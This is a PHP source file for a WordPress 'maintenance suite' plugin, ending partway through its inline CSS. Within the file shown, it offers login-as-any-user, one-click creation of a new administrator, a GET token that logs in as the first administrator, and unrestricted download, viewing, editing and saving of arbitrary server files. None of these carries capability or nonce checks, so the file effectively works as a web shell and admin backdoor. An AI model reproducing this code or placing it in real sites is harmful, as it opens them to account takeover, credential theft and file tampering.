<?php

/**
 * WP Arzo: The Ultimate WordPress Maintenance & Administration Suite - Standalone Version
 * Version: 5.1
 * Developer: Yasir Shabbir
 * Contact: contact@yasirshabbir.com
 * Description: Ultimate WordPress Maintenance & Administration Suite
 */

// Security check
if (!defined('ABSPATH')) {
    exit;
}

// Load WordPress admin functions
if (!function_exists('wp_delete_user')) {
    require_once(ABSPATH . 'wp-admin/includes/user.php');
}

// Handle login actions before any output
$login_message = '';
$login_redirect = '';

if (isset($_POST['login_as_user'])) {
    $user_id = intval($_POST['user_id']);
    $user = get_user_by('id', $user_id);

    if ($user) {
        // Clean output buffer before setting headers
        ob_clean();

        // Clear any existing authentication
        wp_clear_auth_cookie();

        // Set new authentication
        wp_set_current_user($user_id, $user->user_login);
        wp_set_auth_cookie($user_id, true);
        do_action('wp_login', $user->user_login, $user);

        $login_redirect = admin_url();
        $login_message = 'success|Login successful! Opening WordPress admin in new tab...';
    } else {
        $login_message = 'error|User not found!';
    }
}

if (isset($_POST['create_temp_admin'])) {
    $temp_username = 'temp_admin_' . time();
    $temp_password = wp_generate_password(16, true, true);
    $temp_email = 'temp@' . parse_url(home_url(), PHP_URL_HOST);

    $user_id = wp_create_user($temp_username, $temp_password, $temp_email);

    if (!is_wp_error($user_id)) {
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        // Clean output buffer before setting headers
        ob_clean();

        // Clear any existing authentication
        wp_clear_auth_cookie();

        // Set new authentication
        wp_set_current_user($user_id, $temp_username);
        wp_set_auth_cookie($user_id, true);
        do_action('wp_login', $temp_username, $user);

        $login_redirect = admin_url();
        $login_message = 'success|<strong>Temporary Admin Created!</strong><br>Username: ' . $temp_username . '<br>Password: ' . $temp_password . '<br><em>Login successful! Opening WordPress admin in new tab...</em>';
    } else {
        $login_message = 'error|Error creating temporary admin: ' . $user_id->get_error_message();
    }
}

// Handle direct admin access
if (isset($_GET['maintenance_access']) && isset($_GET['maintenance_access'])) {
    $nonce = $_GET['maintenance_access'];
    if (get_transient('maintenance_access_' . $nonce)) {
        // Delete the transient so it can't be reused
        delete_transient('maintenance_access_' . $nonce);

        // Get the first admin user
        $admin_users = get_users(['role' => 'administrator', 'number' => 1]);
        if (!empty($admin_users)) {
            $admin_user = $admin_users[0];

            // Clean output buffer before setting headers
            ob_clean();

            // Clear any existing authentication
            wp_clear_auth_cookie();

            // Set new authentication
            wp_set_current_user($admin_user->ID, $admin_user->user_login);
            wp_set_auth_cookie($admin_user->ID, true);
            do_action('wp_login', $admin_user->user_login, $admin_user);

            // Redirect to admin
            wp_redirect(admin_url());
            exit;
        }
    }
}

// Handle file download BEFORE any HTML output
if (isset($_GET['download'])) {
    // Normalize file path for Windows
    $file_path = $_GET['download'];
    if (DIRECTORY_SEPARATOR === '\\') {
        $file_path = str_replace('/', '\\', $file_path);
    }
    if (file_exists($file_path) && is_file($file_path)) {
        // Clean any output buffers
        while (ob_get_level()) {
            ob_end_clean();
        }

        $file_name = basename($file_path);
        $file_size = filesize($file_path);
        $mime_type = mime_content_type($file_path) ?: 'application/octet-stream';

        header('Content-Description: File Transfer');
        header('Content-Type: ' . $mime_type);
        header('Content-Disposition: attachment; filename="' . $file_name . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . $file_size);

        // Read file in chunks to handle large files
        $handle = fopen($file_path, 'rb');
        while (!feof($handle)) {
            echo fread($handle, 8192);
            flush();
        }
        fclose($handle);
        exit;
    }
}

// Helper functions for file operations
function isEditableFile($file_path)
{
    $editable_extensions = ['php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'txt', 'md', 'sql', 'htaccess', 'log', 'ini', 'conf', 'yml', 'yaml'];
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    return in_array($extension, $editable_extensions) || basename($file_path) === '.htaccess';
}

function isImageFile($file_path)
{
    $image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg'];
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    return in_array($extension, $image_extensions);
}

function isBinaryFile($file_path)
{
    if (!file_exists($file_path) || !is_file($file_path)) {
        return false;
    }

    $binary_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'pdf', 'zip', 'rar', 'tar', 'gz', 'exe', 'dll', 'so', 'dylib'];
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));

    if (in_array($extension, $binary_extensions)) {
        return true;
    }

    // Check file content for binary data
    $handle = fopen($file_path, 'rb');
    $chunk = fread($handle, 1024);
    fclose($handle);

    return strpos($chunk, "\0") !== false;
}

function getSyntaxClass($file_path)
{
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $syntax_map = [
        'php' => 'php',
        'html' => 'html',
        'htm' => 'html',
        'css' => 'css',
        'js' => 'javascript',
        'json' => 'json',
        'xml' => 'xml',
        'sql' => 'sql',
        'md' => 'markdown'
    ];
    return isset($syntax_map[$extension]) ? $syntax_map[$extension] : 'text';
}

function getFileIcon($file_path)
{
    $extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $icon_map = [
        'pdf' => '📄',
        'doc' => '📝',
        'docx' => '📝',
        'xls' => '📊',
        'xlsx' => '📊',
        'ppt' => '📽️',
        'pptx' => '📽️',
        'zip' => '🗜️',
        'rar' => '🗜️',
        'tar' => '🗜️',
        'gz' => '🗜️',
        'mp3' => '🎵',
        'wav' => '🎵',
        'flac' => '🎵',
        'mp4' => '🎬',
        'avi' => '🎬',
        'mov' => '🎬',
        'mkv' => '🎬',
        'jpg' => '🖼️',
        'jpeg' => '🖼️',
        'png' => '🖼️',
        'gif' => '🖼️',
        'bmp' => '🖼️',
        'webp' => '🖼️',
        'exe' => '⚙️',
        'msi' => '⚙️',
        'sql' => '🗃️',
        'php' => '🐘',
        'js' => '📜',
        'css' => '🎨',
        'html' => '🌐'
    ];
    return isset($icon_map[$extension]) ? $icon_map[$extension] : '📄';
}

// Handle AJAX requests for file operations
// Handle AJAX operations (check for 'tab' parameter since 'action' is used by WordPress)
if (isset($_GET['tab']) && $_GET['tab'] === 'ajax' && isset($_GET['operation'])) {
    header('Content-Type: application/json');

    $operation = $_GET['operation'];
    $response = ['success' => false, 'message' => 'Unknown operation'];

    // Helper function to normalize file paths for Windows
    function normalizePath($path)
    {
        // Convert forward slashes to backslashes on Windows
        if (DIRECTORY_SEPARATOR === '\\') {
            $path = str_replace('/', '\\', $path);
        }
        return $path;
    }

    switch ($operation) {
        case 'get_users_page':
            if (isset($_GET['page']) && isset($_GET['per_page'])) {
                $page = intval($_GET['page']);
                $per_page = intval($_GET['per_page']);

                $users = get_users(['number' => $per_page, 'offset' => ($page - 1) * $per_page]);
                $total_users = count_users();
                $total_users = $total_users['total_users'];

                $users_data = [];
                $current_user_id = get_current_user_id();

                foreach ($users as $user) {
                    $is_current = ($user->ID == $current_user_id);
                    $users_data[] = [
                        'id' => $user->ID,
                        'username' => $user->user_login,
                        'email' => $user->user_email,
                        'roles' => implode(', ', $user->roles),
                        'is_current' => $is_current
                    ];
                }

                $response = [
                    'success' => true,
                    'users' => $users_data,
                    'total' => $total_users,
                    'total_pages' => ceil($total_users / $per_page),
                    'current_page' => $page
                ];
            } else {
                $response = ['success' => false, 'message' => 'Missing page parameters'];
            }
            break;

        case 'get_db_tables_page':
            if (isset($_GET['page']) && isset($_GET['per_page'])) {
                global $wpdb;
                $page = intval($_GET['page']);
                $per_page = intval($_GET['per_page']);

                $tables = $wpdb->get_results("SHOW TABLES", ARRAY_N);
                $total_tables = count($tables);

                $tables_data = [];
                $start = ($page - 1) * $per_page;
                $end = min($start + $per_page, $total_tables);

                for ($i = $start; $i < $end; $i++) {
                    if (isset($tables[$i])) {
                        $table_name = $tables[$i][0];
                        $count = $wpdb->get_var("SELECT COUNT(*) FROM $table_name");
                        $tables_data[] = [
                            'name' => $table_name,
                            'rows' => $count
                        ];
                    }
                }

                $response = [
                    'success' => true,
                    'tables' => $tables_data,
                    'total' => $total_tables,
                    'total_pages' => ceil($total_tables / $per_page),
                    'current_page' => $page
                ];
            } else {
                $response = ['success' => false, 'message' => 'Missing page parameters'];
            }
            break;

        case 'get_plugins_page':
            if (isset($_GET['page']) && isset($_GET['per_page'])) {
                $page = intval($_GET['page']);
                $per_page = intval($_GET['per_page']);

                $plugins = get_plugins();
                $total_plugins = count($plugins);

                $plugins_data = [];
                $start = ($page - 1) * $per_page;
                $end = min($start + $per_page, $total_plugins);

                $plugin_keys = array_keys($plugins);
                for ($i = $start; $i < $end; $i++) {
                    if (isset($plugin_keys[$i])) {
                        $plugin_file = $plugin_keys[$i];
                        $plugin_data = $plugins[$plugin_file];
                        $is_active = is_plugin_active($plugin_file);

                        $plugins_data[] = [
                            'file' => $plugin_file,
                            'name' => $plugin_data['Name'],
                            'version' => $plugin_data['Version'],
                            'is_active' => $is_active
                        ];
                    }
                }

                $response = [
                    'success' => true,
                    'plugins' => $plugins_data,
                    'total' => $total_plugins,
                    'total_pages' => ceil($total_plugins / $per_page),
                    'current_page' => $page
                ];
            } else {
                $response = ['success' => false, 'message' => 'Missing page parameters'];
            }
            break;

        case 'clear_debug_log':
            $log_file = WP_CONTENT_DIR . '/debug.log';
            if (file_exists($log_file)) {
                // Clear the debug log file by writing an empty string to it
                if (file_put_contents($log_file, '') !== false) {
                    $response = ['success' => true, 'message' => 'Debug log cleared successfully'];
                } else {
                    $response = ['success' => false, 'message' => 'Failed to clear debug log'];
                }
            } else {
                $response = ['success' => false, 'message' => 'Debug log file does not exist'];
            }
            break;

        case 'view_file':
            if (isset($_GET['file'])) {
                $file_path = normalizePath($_GET['file']);

                // Debug logging removed to prevent JSON interference

                if (file_exists($file_path) && is_file($file_path)) {
                    $filename = basename($file_path);
                    $file_size = filesize($file_path);
                    $file_ext = strtoupper(pathinfo($file_path, PATHINFO_EXTENSION));
                    $modified = date('Y-m-d H:i:s', filemtime($file_path));

                    $file_info = "Size: " . number_format($file_size) . " bytes | Type: {$file_ext} | Modified: {$modified}";

                    if (isBinaryFile($file_path)) {
                        if (isImageFile($file_path)) {
                            // For images, show the image
                            $data_url = 'data:' . mime_content_type($file_path) . ';base64,' . base64_encode(file_get_contents($file_path));
                            $content = '<div class="binary-file-preview">';
                            $content .= '<img src="' . $data_url . '" alt="' . htmlspecialchars($filename) . '">';
                            $content .= '<p>' . $file_info . '</p>';
                            $content .= '</div>';
                        } else {
                            // For other binary files, show icon and info
                            $icon = getFileIcon($file_path);
                            $content = '<div class="binary-file-preview">';
                            $content .= '<div class="file-icon">' . $icon . '</div>';
                            $content .= '<h4>' . htmlspecialchars($filename) . '</h4>';
                            $content .= '<p>This is a binary file that cannot be displayed as text.</p>';
                            $content .= '<p>' . $file_info . '</p>';
                            $content .= '</div>';
                        }
                    } else {
                        // For text files, show content
                        $file_content = file_get_contents($file_path);
                        $syntax_class = getSyntaxClass($file_path);
                        $content = '<div style="margin-bottom: 10px; font-size: 12px; color: #999;">' . $file_info . '</div>';
                        $content .= '<pre style="background: #2A2A2A; color: #E0E0E0; padding: 15px; border-radius: 4px; overflow-x: auto; font-family: \'Courier New\', monospace; font-size: 13px; line-height: 1.5; margin: 0; white-space: pre-wrap; word-wrap: break-word; max-height: 60vh; overflow-y: auto;"><code>' . htmlspecialchars($file_content) . '</code></pre>';
                    }

                    $actions = '';
                    if (isEditableFile($file_path)) {
                        $actions .= '<button onclick="editFile(\'' . addslashes($file_path) . '\')" class="btn btn-warning" title="Edit File"><i class="fas fa-edit"></i> Edit</button> ';
                    }
                    $actions .= '<a href="' . admin_url('admin-ajax.php?action=wp_arzo_standalone&tab=files&download=' . urlencode($file_path)) . '" class="btn btn-success" title="Download File"><i class="fas fa-download"></i> Download</a> ';
                    $actions .= '<button onclick="closeLightbox()" class="btn btn-secondary" title="Close"><i class="fas fa-times"></i> Close</button>';

                    $response = [
                        'success' => true,
                        'filename' => $filename,
                        'content' => $content,
                        'actions' => $actions
                    ];
                } else {
                    $response = [
                        'success' => false,
                        'message' => 'File not found or not accessible',
                        'debug' => [
                            'original_path' => $_GET['file'],
                            'normalized_path' => $file_path,
                            'file_exists' => file_exists($file_path),
                            'is_file' => is_file($file_path),
                            'directory_separator' => DIRECTORY_SEPARATOR,
                            'realpath' => realpath($file_path)
                        ]
                    ];
                }
            }
            break;

        case 'edit_file':
            if (isset($_GET['file'])) {
                $file_path = normalizePath($_GET['file']);

                // Debug logging removed to prevent JSON interference

                if (file_exists($file_path) && is_file($file_path) && isEditableFile($file_path)) {
                    $filename = basename($file_path);
                    $file_content = file_get_contents($file_path);
                    $syntax_class = getSyntaxClass($file_path);

                    $file_size = filesize($file_path);
                    $file_ext = strtoupper(pathinfo($file_path, PATHINFO_EXTENSION));
                    $modified = date('Y-m-d H:i:s', filemtime($file_path));
                    $file_info = "Size: " . number_format($file_size) . " bytes | Type: {$file_ext} | Modified: {$modified}";

                    $content = '<div style="margin-bottom: 10px; font-size: 12px; color: #999;">' . $file_info . '</div>';
                    $content .= '<textarea id="fileContentEditor" style="width: 100%; min-height: 500px; background: #2A2A2A; color: #E0E0E0; border: 1px solid #444444; border-radius: 4px; padding: 15px; font-family: \'Courier New\', monospace; font-size: 13px; line-height: 1.5; resize: vertical; box-sizing: border-box;">' . htmlspecialchars($file_content) . '</textarea>';

                    $actions = '<button onclick="saveFile(\'' . addslashes($file_path) . '\')" class="btn btn-primary" title="Save Changes"><i class="fas fa-save"></i> Save</button> ';
                    $actions .= '<button onclick="viewFile(\'' . addslashes($file_path) . '\')" class="btn btn-secondary" title="Cancel"><i class="fas fa-undo"></i> Cancel</button>';

                    $response = [
                        'success' => true,
                        'filename' => $filename,
                        'content' => $content,
                        'actions' => $actions
                    ];
                } else {
                    $response['message'] = 'File not found, not accessible, or not editable';
                }
            }
            break;

        case 'save_file':
            if (isset($_POST['file_path']) && isset($_POST['file_content'])) {
                $file_path = normalizePath($_POST['file_path']);
                $file_content = $_POST['file_content'];

                if (file_exists($file_path) && is_file($file_path) && isEditableFile($file_path)) {
                    if (file_put_contents($file_path, $file_content) !== false) {
                        $response = ['success' => true, 'message' => 'File saved successfully'];
                    } else {
                        $response['message'] = 'Error writing to file';
                    }
                } else {
                    $response['message'] = 'File not found, not accessible, or not editable';
                }
            }
            break;

        case 'log_debug_change':
            if (isset($_POST['setting_name']) && isset($_POST['new_value'])) {
                $setting = sanitize_text_field($_POST['setting_name']);
                $value = sanitize_text_field($_POST['new_value']);

                // Create log entry
                $timestamp = date('Y-m-d H:i:s');
                $log_entry = "[{$timestamp}] Debug setting '{$setting}' changed to: " . ($value == '1' ? 'enabled' : 'disabled') . "\n";

                // Write to debug log file
                $log_file = WP_CONTENT_DIR . '/debug.log';
                if (file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX) !== false) {
                    $response = ['success' => true, 'message' => 'Debug change logged successfully'];
                } else {
                    $response = ['success' => false, 'message' => 'Failed to write to debug log'];
                }
            } else if (isset($_POST['log_entry'])) {
                // Alternative method using direct log entry
                $log_entry = sanitize_text_field($_POST['log_entry']) . "\n";

                // Write to debug log file
                $log_file = WP_CONTENT_DIR . '/debug.log';
                if (file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX) !== false) {
                    $response = ['success' => true, 'message' => 'Debug change logged successfully'];
                } else {
                    $response = ['success' => false, 'message' => 'Failed to write to debug log'];
                }
            } else {
                $response = ['success' => false, 'message' => 'Missing required parameters'];
            }
            break;
    }

    echo json_encode($response);
    exit;
}

// Get action (use 'tab' parameter since 'action' is used by WordPress AJAX)
$action = $_GET['tab'] ?? $_GET['action'] ?? 'info';
// Handle 'wp_arzo_standalone' as default info page
if ($action === 'wp_arzo_standalone') {
    $action = 'info';
}

?>
<!DOCTYPE html>
<html>

<head>
    <title>System Maintenance Tool</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="<?php echo WP_ARZO_PLUGIN_URL . 'assets/css/wp-arzo.css?v=' . WP_ARZO_VERSION; ?>">
    <style style="display:none;">
    /* CSS moved to external file: assets/css/wp-arzo.css */
    @import url('https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap');

    :root {
        --accent-color: #16e791;
        --primary-text: #ffffff;
        --secondary-text: #e0e0e0;
        --background-dark: #121212;
        --background-medium: #1e1e1e;
        --background-light: #2a2a2a;
        --border-color: #333333;
        --border-light: #444444;
        --success-color: #28a745;
        --warning-color: #ffc107;
        --danger-color: #dc3545;
        --info-color: #17a2b8;
        --secondary-color: #6c757d;
    }

    body {
        font-family: 'Lato', sans-serif;
        margin: 0;
        padding: 20px;
        background: var(--background-dark);
        color: var(--secondary-text);
        min-height: 100vh;
    }

    .container {
        max-width: 1200px;
        margin: 0 auto;
        background: var(--background-medium);
        padding: 20px;
        border-radius: 3px;
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
    }

    h1 {
        color: var(--primary-text);
        margin-bottom: 10px;
        font-weight: 700;
    }

    h2 {
        color: var(--accent-color);
        border-bottom: 2px solid var(--border-color);
        padding-bottom: 10px;
        font-weight: 400;
    }

    h3 {
        color: var(--secondary-text);
        margin-top: 25px;
        font-weight: 400;
    }

    .developer-info {
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-size: 12px;
        color: #999;
        margin-bottom: 20px;
        padding-bottom: 10px;
        border-bottom: 1px solid #333333;
    }

    .developer-logo {
        display: flex;
        align-items: center;
        gap: 10px;
    }

    .developer-logo img {
        width: 40px;
        height: 40px;
        border-radius: 50%;
    }

    .developer-logo a {
        color: var(--accent-color);
        text-decoration: none;
        font-weight: 500;
    }



    .nav {
        margin-bottom: 20px;
        display: flex;
        flex-wrap: wrap;
        gap: 5px;
        border-bottom: 2px solid var(--border-color);
        padding-bottom: 0;
    }

    .nav a {
        padding: 12px 20px;
        background: var(--background-light);
        color: var(--secondary-text);
        text-decoration: none;
        border-radius: 8px 8px 0 0;
        font-weight: 500;
        transition: all 0.3s ease;
        border: 2px solid var(--border-color);
        border-bottom: none;
        position: relative;
        margin-bottom: -2px;
    }

    .nav a:hover {
        background: #3A3A3A;
        color: var(--accent-color);
        transform: translateY(-2px);
    }

    .nav a.active {
        background: var(--accent-color);
        color: var(--background-dark);
        border-color: var(--accent-color);
        z-index: 1;
    }

    .nav a.active:hover {
        background: #0ea66b;
        color: var(--background-dark);
        transform: none;
    }

    /* Toggle Switch Styles */
    .switch {
        position: relative;
        display: inline-block;
        width: 60px;
        height: 34px;
    }

    .switch input {
        opacity: 0;
        width: 0;
        height: 0;
    }

    .slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #ccc;
        transition: .4s;
        border-radius: 34px;
    }

    .slider:before {
        position: absolute;
        content: "";
        height: 26px;
        width: 26px;
        left: 4px;
        bottom: 4px;
        background-color: white;
        transition: .4s;
        border-radius: 50%;
    }

    input:checked+.slider {
        background-color: var(--accent-color);
    }

    input:focus+.slider {
        box-shadow: 0 0 1px var(--accent-color);
    }

    input:checked+.slider:before {
        transform: translateX(26px);
    }

    .slider.round {
        border-radius: 34px;
    }

    .slider.round:before {
        border-radius: 50%;
    }
    }

    .content {
        background: var(--background-medium);
        padding: 20px;
        border-left: 4px solid var(--accent-color);
        margin: 15px 0;
        border-radius: 3px;
    }

    table {
        width: 100%;
        border-collapse: collapse;
        margin: 15px 0;
        background: var(--background-medium);
    }

    th,
    td {
        padding: 12px;
        text-align: left;
        border-bottom: 1px solid var(--border-color);
    }

    th {
        background: var(--border-color);
        color: var(--accent-color);
        font-weight: 600;
    }

    tr:hover {
        background: var(--background-light);
    }

    .success {
        color: #4CAF50;
        background: #1B5E20;
        padding: 10px;
        border-radius: 3px;
        margin: 10px 0;
    }

    .error {
        color: #F44336;
        background: #B71C1C;
        padding: 10px;
        border-radius: 3px;
        margin: 10px 0;
    }

    .form-group {
        margin: 15px 0;
    }

    /* Override margin for debug settings grid */
    .debug-settings-grid .form-group {
        margin: 0;
    }

    .form-group label {
        display: block;
        margin-bottom: 8px;
        color: #E0E0E0;
        font-weight: 500;
    }

    .form-group input,
    .form-group select,
    .form-group textarea {
        width: 100%;
        padding: 12px;
        border: 1px solid var(--border-color);
        border-radius: 3px;
        background: var(--background-light);
        color: var(--secondary-text);
        font-family: 'Lato', sans-serif;
        box-sizing: border-box;
    }

    .form-group input:focus,
    .form-group select:focus,
    .form-group textarea:focus {
        outline: none;
        border-color: var(--accent-color);
        box-shadow: 0 0 0 2px rgba(22, 231, 145, 0.2);
    }

    .btn {
        padding: 12px 20px;
        background: var(--accent-color);
        color: var(--background-dark);
        border: none;
        border-radius: 3px;
        cursor: pointer;
        font-family: 'Lato', sans-serif;
        font-weight: 500;
        transition: background 0.3s ease;
    }

    .btn:hover {
        background: #0ea66b;
        color: var(--primary-text);
    }

    .btn:active {
        transform: translateY(1px);
    }

    .file-list,
    .scrollable-table-container,
    .scrollable-select {
        max-height: 400px;
        overflow-y: auto;
        border: 1px solid var(--border-color);
        border-radius: 3px;
    }

    .file-list::-webkit-scrollbar,
    .scrollable-table-container::-webkit-scrollbar,
    .scrollable-select::-webkit-scrollbar {
        width: 8px;
    }

    .file-list::-webkit-scrollbar-track,
    .scrollable-table-container::-webkit-scrollbar-track,
    .scrollable-select::-webkit-scrollbar-track {
        background: var(--background-light);
    }

    .file-list::-webkit-scrollbar-thumb,
    .scrollable-table-container::-webkit-scrollbar-thumb,
    .scrollable-select::-webkit-scrollbar-thumb {
        background: var(--accent-color);
        border-radius: 3px;
    }

    .file-list::-webkit-scrollbar-thumb:hover,
    .scrollable-table-container::-webkit-scrollbar-thumb:hover,
    .scrollable-select::-webkit-scrollbar-thumb:hover {
        background: #0ea66b;
    }

    .scrollable-select {
        max-height: 200px;
        position: relative;
    }

    .scrollable-select select {
        width: 100%;
        max-height: 200px;
        overflow-y: auto;
        padding: 8px;
        border: 1px solid var(--border-color);
        background-color: var(--background-dark);
        color: var(--primary-text);
        border-radius: 3px;
    }

    .scrollable-select select option {
        padding: 8px;
        background-color: var(--background-dark);
        color: var(--primary-text);
    }

    .scrollable-select select option:hover {
        background-color: var(--accent-color);
        color: white;
    }

    .pagination-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 15px;
        padding: 10px;
        background: var(--background-medium);
        border-radius: 3px;
        border: 1px solid var(--border-color);
    }

    .pagination-info {
        color: var(--secondary-text);
        font-size: 14px;
    }

    .pagination-controls {
        display: flex;
        gap: 5px;
    }

    .pagination-controls button {
        background: var(--background-light);
        border: 1px solid var(--border-color);
        color: var(--primary-text);
        padding: 5px 10px;
        border-radius: 3px;
        cursor: pointer;
        transition: all 0.2s ease;
    }

    .pagination-controls button:hover {
        background: var(--accent-color);
        color: white;
    }

    .pagination-controls button.active {
        background: var(--accent-color);
        color: white;
    }

    .pagination-controls button:disabled {
        opacity: 0.5;
        cursor: not-allowed;
    }

    .pagination-controls button:disabled:hover {
        background: var(--background-light);
        color: var(--primary-text);
    }

    a {
        color: var(--accent-color);
        text-decoration: none;
    }


    .file-editor {
        background: var(--background-medium);
        border: 1px solid var(--border-color);
        border-radius: 3px;
        margin: 15px 0;
    }

    .file-editor-header {
        background: var(--border-color);
        padding: 10px 15px;
        border-bottom: 1px solid var(--border-light);
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    .file-editor-header h4 {
        margin: 0;
        color: var(--accent-color);
        font-size: 14px;
    }

    .file-editor-actions {
        display: flex;
        gap: 10px;
    }

    .file-editor-actions .btn {
        padding: 6px 12px;
        font-size: 12px;
    }

    .file-editor-content {
        position: relative;
    }

    .file-editor-content textarea {
        width: 100%;
        min-height: 400px;
        padding: 15px;
        border: none;
        background: var(--background-medium);
        color: var(--secondary-text);
        font-family: 'Courier New', monospace;
        font-size: 13px;
        line-height: 1.5;
        resize: vertical;
        box-sizing: border-box;
    }

    .file-editor-content textarea:focus {
        outline: none;
        background: #252525;
    }

    .file-info {
        background: var(--background-light);
        padding: 8px 15px;
        border-top: 1px solid var(--border-light);
        font-size: 12px;
        color: #999;
    }

    .file-actions {
        display: flex;
        gap: 5px;
        align-items: center;
    }

    .file-actions .btn {
        padding: 4px 8px;
        font-size: 11px;
        background: transparent !important;
        color: var(--accent-color) !important;
        border: 1px solid transparent !important;
        transition: all 0.3s ease;
    }

    .file-actions .btn:hover {
        background: var(--accent-color) !important;
        color: var(--primary-text) !important;
        border-color: var(--accent-color) !important;
    }

    .btn-view {
        background: #4CAF50;
        color: white;
    }

    .btn-view:hover {
        background: #45a049;
    }

    .btn-edit {
        background: #2196F3;
        color: white;
    }

    .btn-edit:hover {
        background: #1976D2;
    }

    .btn-download {
        background: #9C27B0;
        color: white;
    }

    .btn-download:hover {
        background: #7B1FA2;
    }

    /* Button Color Variations */
    .btn-primary {
        background-color: var(--accent-color);
        border-color: var(--accent-color);
        color: var(--background-dark);
    }

    .btn-primary:hover {
        background-color: #0ea66b;
        border-color: #0ea66b;
        color: var(--primary-text);
    }

    .btn-info {
        background-color: var(--info-color);
        border-color: var(--info-color);
        color: var(--primary-text);
    }

    .btn-info:hover {
        background-color: #138496;
        border-color: #138496;
    }

    .btn-warning {
        background-color: var(--warning-color);
        border-color: var(--warning-color);
        color: var(--background-dark);
    }

    .btn-warning:hover {
        background-color: #e0a800;
        border-color: #e0a800;
        color: var(--primary-text);
    }

    .btn-success {
        background-color: var(--success-color);
        border-color: var(--success-color);
        color: var(--primary-text);
    }

    .btn-success:hover {
        background-color: #218838;
        border-color: #218838;
    }

    .btn-danger {
        background-color: var(--danger-color);
        border-color: var(--danger-color);
        color: var(--primary-text);
    }

    .btn-danger:hover {
        background-color: #c82333;
        border-color: #c82333;
    }

    .btn-secondary {
        background-color: var(--secondary-color);
        border-color: var(--secondary-color);
        color: var(--primary-text);
    }

    .btn-secondary:hover {
        background-color: #5a6268;
        border-color: #5a6268;
    }

    /* Lightbox Modal Styles */
    .lightbox {
        display: none;
        position: fixed;
        z-index: 1000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.9);
        animation: fadeIn 0.3s ease;
    }

    .lightbox.active {
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .lightbox-content {
        background: var(--background-medium);
        border-radius: 8px;
        width: 80vw;
        max-height: 90%;
        overflow: hidden;
        position: relative;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
    }

    .lightbox-header {
        background: linear-gradient(135deg, var(--accent-color) 0%, #0ea66b 100%);
        padding: 15px 20px;
        border-bottom: 1px solid var(--border-light);
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    .lightbox-header h3 {
        margin: 0;
        color: var(--primary-text);
        font-size: 16px;
    }

    .lightbox-close {
        background: none;
        border: none;
        color: var(--primary-text);
        font-size: 24px;
        cursor: pointer;
        padding: 0;
        width: 30px;
        height: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 50%;
        transition: background 0.3s ease;
    }

    .lightbox-close:hover {
        background: rgba(255, 255, 255, 0.2);
        color: var(--primary-text);
    }

    .lightbox-body {
        padding: 20px;
        max-height: 70vh;
        overflow-y: auto;
    }

    .lightbox-body textarea {
        width: 100%;
        min-height: 500px;
        background: var(--background-light);
        color: var(--secondary-text);
        border: 1px solid var(--border-light);
        border-radius: 4px;
        padding: 15px;
        font-family: 'Courier New', monospace;
        font-size: 13px;
        line-height: 1.5;
        resize: vertical;
    }

    .lightbox-body pre {
        background: var(--background-light);
        color: var(--secondary-text);
        padding: 15px;
        border-radius: 4px;
        overflow-x: auto;
        font-family: 'Courier New', monospace;
        font-size: 13px;
        line-height: 1.5;
        margin: 0;
        white-space: pre-wrap;
        word-wrap: break-word;
    }

    .lightbox-actions {
        background: var(--background-medium);
        padding: 20px;
        border-top: 1px solid var(--border-color);
        display: flex;
        gap: 12px;
        justify-content: flex-end;
        align-items: center;
    }

    .lightbox-actions .btn {
        padding: 12px 20px !important;
        font-size: 14px !important;
        font-weight: 500 !important;
        border-radius: 6px !important;
        border: 2px solid transparent !important;
        cursor: pointer !important;
        transition: all 0.3s ease !important;
        text-decoration: none !important;
        display: inline-flex !important;
        align-items: center !important;
        gap: 8px !important;
        min-width: 120px !important;
        justify-content: center !important;
    }

    .lightbox-actions .btn-primary {
        background: var(--accent-color) !important;
        color: var(--background-dark) !important;
        border-color: var(--accent-color) !important;
    }

    .lightbox-actions .btn-primary:hover {
        background: #0ea66b !important;
        border-color: #0ea66b !important;
        color: var(--primary-text) !important;
        transform: translateY(-2px) !important;
        box-shadow: 0 4px 12px rgba(14, 166, 107, 0.3) !important;
    }

    .lightbox-actions .btn-secondary {
        background: var(--background-light) !important;
        color: var(--secondary-text) !important;
        border-color: var(--border-color) !important;
    }

    .lightbox-actions .btn-secondary:hover {
        background: var(--border-color) !important;
        color: var(--primary-text) !important;
        border-color: #0ea66b !important;
        transform: translateY(-2px) !important;
    }

    .lightbox-actions .btn-warning {
        background: var(--warning-color) !important;
        color: var(--primary-text) !important;
        border-color: var(--warning-color) !important;
    }

    .lightbox-actions .btn-warning:hover {
        background: #e67e22 !important;
        border-color: #e67e22 !important;
        transform: translateY(-2px) !important;
        box-shadow: 0 4px 12px rgba(230, 126, 34, 0.3) !important;
    }

    .lightbox-actions .btn-success {
        background: var(--success-color) !important;
        color: var(--primary-text) !important;
        border-color: var(--success-color) !important;
    }

    .lightbox-actions .btn-success:hover {
        background: #27ae60 !important;
        border-color: #27ae60 !important;
        transform: translateY(-2px) !important;
        box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3) !important;
    }

    .lightbox-actions .btn i {
